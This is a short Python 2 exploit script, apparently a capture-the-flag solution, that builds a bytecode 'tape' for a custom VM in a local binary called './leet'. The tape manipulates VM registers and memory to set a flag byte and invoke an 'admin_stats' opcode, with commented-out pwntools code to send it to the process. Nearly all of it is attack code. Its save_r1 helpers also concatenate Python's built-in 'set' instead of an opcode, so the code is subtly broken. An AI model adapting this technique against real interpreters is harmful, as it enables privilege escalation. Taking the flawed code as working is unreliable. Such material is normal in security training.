#!/usr/bin/python

import subprocess
from struct import pack

# Wrappers 
quit = chr(0)
inc_reg_1 = chr(1)
dec_reg_1 = chr(2)
inc_reg_2 = chr(3)
dec_reg_2 = chr(4)
set_f = chr(5)
set_word = chr(6)
get = chr(7)
get_word = chr(8)
load_r1 = lambda r1: chr(9) + chr(r1)
load_r1_word = lambda r1: chr(10) + pack('<I', r1)
load_r1_word_signed = lambda r1: chr(10) + pack('<i', r1)
print_f = chr(11)
swap = chr(12)
je = lambda addr: chr(13) + chr(addr)
jz = lambda addr: chr(14) + chr(addr)
jmp = lambda addr: chr(15) + chr(addr)
add = chr(16)
admin_stats = chr(17)

# Helpers
load_r2 = lambda r2: swap + load_r1(r2) + swap
load_r2_word = lambda r2: swap + load_r1_word(r2) + swap
save_r1 = lambda addr: swap + load_r1(addr) + set + swap # lose r2
save_r1_word = lambda addr: swap + load_r1_word(addr) + set_word + swap # lose r2
save_r1_word_signed = lambda addr: swap + load_r1_word_signed(addr) + set_word + swap # lose r2

tape = []
# tape += load_r1(70) + print_f + load_r1(0)
tape += dec_reg_1 + save_r1(0) + get + swap + load_r2(ord('N')-1) + inc_reg_2
tape += je(len(tape)+3+3+3)
tape += load_r1_word(0)	# not actually 0 becasue ..
r1_saved = chr(len(tape) -4)
tape[8-5] = r1_saved # we save r1 to here earlier
tape += jmp(0)
tape += load_r1_word(ord(r1_saved)) + get_word + swap
tape += load_r2(ord('Y'))
tape += set_f
tape += admin_stats
tape += '\x00'
# tape += load_r1(70) + print_f
# while len(tape) < 70-1:
# 	tape += print_f
# tape += 
print ''.join(tape),

# conn = process('./leet')
# conn.sendline(''.join(tape))
# print conn.interactive()





